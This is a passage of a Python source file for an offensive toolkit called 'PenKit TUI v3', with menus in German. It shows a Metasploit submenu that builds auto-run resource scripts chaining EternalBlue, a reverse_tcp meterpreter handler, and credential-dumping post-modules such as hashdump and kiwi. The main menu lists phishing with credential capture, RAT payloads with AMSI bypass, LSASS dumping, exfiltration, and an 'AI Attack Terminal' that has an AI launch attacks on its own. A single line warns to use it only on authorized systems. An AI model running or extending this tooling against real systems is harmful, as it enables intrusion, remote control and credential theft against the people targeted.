            print(f"  {C}{cmd}{R}\n")
            print(f"  {Y}[→] Oder als RC-Datei (empfohlen für mehrere Sessions):{R}")
            print(f"  {C}echo '{rc_content[:80]}...' > /tmp/handler.rc{R}")
            print(f"  {C}{rc_start}{R}")

        elif choice == "3":
            banner(); section("💥  TOP EXPLOIT MODULE", "Die wichtigsten MSF-Exploits")
            info_box([
                "Fertige msfconsole-Befehle für die gefährlichsten Exploits.",
                "",
                "Immer erst prüfen ob Ziel anfällig ist:",
                "  → nmap -sV --script vuln <target>",
                "  → PenKit → Netzwerk → Auto-Exploit Suggester",
                "",
                "⛔ NUR auf eigenen/autorisierten Systemen!",
            ])
            print()
            lhost = ask("LHOST — deine Kali IP", "10.10.10.1")
            try:
                lport = int(ask("LPORT", "4444"))
            except ValueError:
                lport = 4444
            print()
            from tools.network.msf_integration import show_top_exploits
            await run_tool_live(show_top_exploits(lhost, lport))

        elif choice == "4":
            banner(); section("🔧  POST-EXPLOITATION MODULE", "Meterpreter Befehle nach erstem Shell")
            info_box([
                "Post-Exploitation Module laufen in einer aktiven Meterpreter-Session.",
                "",
                "In msfconsole: sessions -l  →  sessions -i <ID>  →  Modul ausführen",
                "",
                "Wichtigste Befehle: getsystem, hashdump, load kiwi, creds_all",
            ])
            print()
            print(f"  {Y}Kategorie:{R}")
            print(f"  {C}[1]{R} Privilege Escalation  {C}[2]{R} Credential Harvesting")
            print(f"  {C}[3]{R} Persistence            {C}[4]{R} Enumeration")
            print(f"  {C}[5]{R} Lateral Movement       {C}[6]{R} Cleanup")
            print(f"  {C}[A]{R} Alle anzeigen")
            print()
            cat_map = {
                "1": "Privilege", "2": "Credential", "3": "Persistence",
                "4": "Enumeration", "5": "Lateral", "6": "Cleanup",
            }
            sub = prompt("kategorie")
            cat = "all" if sub.lower() == "a" or sub not in cat_map else cat_map[sub]
            print()
            from tools.network.msf_integration import show_post_modules
            await run_tool_live(show_post_modules(cat))

        elif choice == "5":
            banner(); section("📜  RESOURCE SCRIPT GENERATOR", "Vollautomatisch: Exploit → Shell → Post-Modules")
            info_box([
                "RC-Script = automatisches MSF-Script das alle Schritte nacheinander ausführt.",
                "",
                "Starten: msfconsole -r /tmp/penkit_auto.rc",
                "",
                "Was das Script macht:",
                "  1. Exploit ausführen",
                "  2. Multi/Handler starten (für weitere Sessions)",
                "  3. Nach Session: Post-Module automatisch ausführen",
                "     (sysinfo, getsystem, hashdump, enum_domain, autoroute)",
            ])
            print()
            lhost  = ask("LHOST — deine Kali IP", required=True)
            if not lhost: wait_key(); continue
            try:
                lport = int(ask("LPORT", "4444"))
            except ValueError:
                lport = 4444
            target = ask("Ziel-IP", required=True)
            if not target: wait_key(); continue
            module = ask("MSF Modul", "exploit/windows/smb/ms17_010_eternalblue")
            payload = ask("Payload", "windows/x64/meterpreter/reverse_tcp")
            print()
            from tools.network.msf_integration import build_resource_script, build_post_rc
            rc = build_resource_script(lhost, lport, target, module, payload)
            post_rc = build_post_rc()
            print(f"  {G}[+] RC-Script speichern und starten:{R}\n")
            print(f"  {C}cat > /tmp/penkit_auto.rc << 'EOF'\n{rc}\nEOF{R}")
            print(f"  {C}cat > /tmp/post.rc << 'EOF'\n{post_rc}\nEOF{R}")
            print(f"\n  {Y}[→] Starten:{R}")
            print(f"  {C}msfconsole -r /tmp/penkit_auto.rc{R}")

        elif choice == "6":
            banner(); section("🗄️  MSF DATENBANK SETUP", "postgresql + msfdb init")
            info_box([
                "Metasploit-DB speichert: Hosts, Services, Credentials, Loot.",
                "Macht: workspace management, db_nmap, db_autopwn möglich.",
                "",
                "Nach Setup in msfconsole:",
                "  db_status         — Verbindung prüfen",
                "  db_import scan.xml — Nmap-Scan importieren",
                "  hosts             — alle bekannten Hosts",
                "  services          — alle gefundenen Services",
                "  creds             — alle gefundenen Credentials",
            ])
            print()
            from tools.network.msf_integration import setup_msfdb
            await run_tool_live(setup_msfdb())

        wait_key()


def boot_sequence():
    clr()
    lines = [
        f"{DG}[{G}*{DG}]{R} Initializing PenKit TUI v3...",
        f"{DG}[{G}*{DG}]{R} Loading modules...",
        f"{DG}[{G}*{DG}]{R} Checking privileges...",
        f"{DG}[{G}+{DG}]{G} Root access confirmed{R}",
        f"{DG}[{G}*{DG}]{R} All systems operational",
    ]
    for line in lines:
        slow(f"  {line}", delay=0.012)
        time.sleep(0.08)
    time.sleep(0.3)


# ═════════════════════════════════════════════════════════════════════════════
# MAIN LOOP
# ═════════════════════════════════════════════════════════════════════════════

async def main_menu():
    boot_sequence()

    while True:
        banner()
        print(f"  {DIM}┌{'─'*66}┐{R}")
        print(f"  {DIM}│{'  🔴  RED TEAM':^66}│{R}")
        print(f"  {DIM}├{'─'*66}┤{R}")
        menu_item(" 1", "📡  WiFi Attacks",          "🟠", "WPA2/3 crack, Evil Twin, PMKID, Deauth, Handshake")
        menu_item(" 2", "🌐  Network Intelligence",  "🟠", "Nmap scan, CVE check, topology map, attack chain")
        menu_item(" 3", "💻  Web Attack",            "🟠", "SQLmap, ffuf, nikto, XSS, LFI, BeEF, dalfox")
        menu_item(" 4", "🔑  Passwords & Hashes",   "🟡", "Hashcat GPU, John, Hydra brute-force, hash detect")
        menu_item(" 5", "☠️   MITM",                  "🔴", "ARP spoof, SSL strip, Responder, DNS poison")
        menu_item(" 6", "🔍  OSINT Recon",           "🟡", "Emails, Shodan, Breach-Lookup, LinkedIn, HIBP")
        menu_item(" 7", "🎣  Phishing Suite",        "⛔", "Fake Login, Telegram-Alert, Email-Kampagnen, Creds")
        menu_item(" 9", "💀  C2 / RAT Payloads",     "⛔", "AMSI bypass, fileless shellcode, hollow, disguise")
        menu_item(" W", "🏰  Active Directory",      "⛔", "Kerberoast, PtH, BloodHound, DCSync, Golden Ticket")
        menu_item(" P", "🔥  Post-Exploitation",     "⛔", "WinPEAS, LSASS Dump, Persistence, Exfil, LOLBAS")
        menu_item(" L", "🔀  Lateral Movement",      "⛔", "PTH, PTT, SMBExec, WMIExec, NTLM Relay, Pivot")
        menu_item(" X", "💣  Metasploit",            "⛔", "Payloads, Handler, Top-Exploits, Post-Modules, RC")
        print(f"  {DIM}├{'─'*66}┤{R}")
        print(f"  {DIM}│{'  🔵  BLUE TEAM  /  🃏  JOKER':^66}│{R}")
        print(f"  {DIM}├{'─'*66}┤{R}")
        menu_item(" 8", "🔵  Blue Team Defense",     "🟢", "ARP watch, auth.log, honeypot, port monitor")
        menu_item(" J", "🃏  Joker / Pranks",        "🟡", "Fake BSOD, Kahoot bot, browser chaos, pranks")
        print(f"  {DIM}├{'─'*66}┤{R}")
        print(f"  {DIM}│{'  🛠️   HILFE & SYSTEM':^66}│{R}")
        print(f"  {DIM}├{'─'*66}┤{R}")
        menu_item(" ?", "🤖  KI-Assistent",          "🟢", "Frage stellen → Tool-Empfehlung")
        menu_item(" A", "🧠  AI Attack Terminal",    "🔴", "KI startet Angriffe + passt sich an (Ollama kostenlos)")
        menu_item(" N", "🧅  Anonymität / Tor",      "🟢", "Tor starten, IP-Leak-Check, proxychains")
        menu_item(" T", "📚  Tutorials",              "🟢", "Schritt-für-Schritt Anleitungen für alle Module")
        menu_item(" H", "🏥  Health Check",           "🟢", "Prüft welche Tools installiert sind")
        menu_item(" M", "🗺️   Target Map",             "🟡", "Interaktive Karte mit allen bekannten Ziel-Infos")
        menu_item(" R", "📊  HTML Report",            "🟢", "Alle Scan-Ergebnisse → professioneller HTML-Report")
        menu_item(" O", "📁  Output-Verzeichnis",     "🟢", "Zeigt ~/penkit-output/ — alle gespeicherten Dateien")
        print(f"  {DIM}└{'─'*66}┘{R}")
        print()
        menu_item(" 0", "❌  Exit", "")

        choice = prompt("penkit")

        dispatch = {
            "1": menu_wifi,
            "2": menu_network,
            "3": menu_web,
            "4": menu_passwords,
            "5": menu_mitm,
            "6": menu_osint,
            "7": menu_phishing,
            "8": menu_blueteam,
            "9": menu_c2,
            "w": menu_ad, "W": menu_ad,
            "p": menu_postexploit, "P": menu_postexploit,
            "l": menu_lateral, "L": menu_lateral,
            "x": menu_msf, "X": menu_msf,
            "j": menu_joker, "J": menu_joker,
            "?": menu_assistant,
            "t": menu_tutorials, "T": menu_tutorials,
            "h": menu_health, "H": menu_health,
            "m": menu_map,   "M": menu_map,
            "r": menu_report, "R": menu_report,
            "o": menu_output,"O": menu_output,
            "a": menu_ai_terminal, "A": menu_ai_terminal,
            "n": menu_anon,  "N": menu_anon,
        }

        if choice == "0":
            clr()
            slow(f"\n  {G}[*] Goodbye.{R}\n", delay=0.03)
            sys.exit(0)
        elif choice in dispatch:
            await dispatch[choice]()


def run():
    try:
        asyncio.run(main_menu())
    except KeyboardInterrupt:
        print(f"\n\n  {G}[*] Session terminated.{R}\n")
        sys.exit(0)


if __name__ == "__main__":
    run()
